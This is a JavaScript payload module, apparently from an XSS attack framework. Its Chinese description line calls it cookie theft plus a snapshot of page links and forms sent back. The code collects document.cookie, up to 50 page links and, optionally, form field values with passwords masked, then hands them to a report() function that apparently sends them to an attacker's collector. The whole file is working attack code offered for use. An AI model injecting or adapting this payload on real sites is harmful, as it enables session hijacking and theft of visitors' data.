// MODULE = {"desc": "Cookie 窃取 + 页面链接/表单快照回传", "category": "信息收集", "params": [["urls", "收集页面链接 1/0,默认 1"], ["forms", "收集表单输入 1/0,默认 0"]]}
(function () {
  function snapshot() {
    var d = { type: "cookie", url: location.href, cookie: "", links: [], forms: [] };
    try { d.cookie = document.cookie || ""; } catch (e) {}
    if (_q("urls", "{{urls}}") === "1") {
      var links = document.querySelectorAll("a[href]");
      for (var i = 0; i < links.length && d.links.length < 50; i++) {
        d.links.push(links[i].href);
      }
    }
    if (_q("forms", "{{forms}}") === "1") {
      var forms = document.querySelectorAll("form");
      for (var j = 0; j < forms.length && d.forms.length < 20; j++) {
        var inputs = forms[j].querySelectorAll("input,textarea,select");
        var vals = [];
        for (var k = 0; k < inputs.length; k++) {
          var el = inputs[k];
          var nm = el.name || el.id || ("f" + k);
          var v = el.value || "";
          if (el.type === "password") { v = "****"; }
          vals.push(nm + "=" + v);
        }
        d.forms.push(vals.join("&"));
      }
    }
    report(d);
  }
  snapshot();
})();
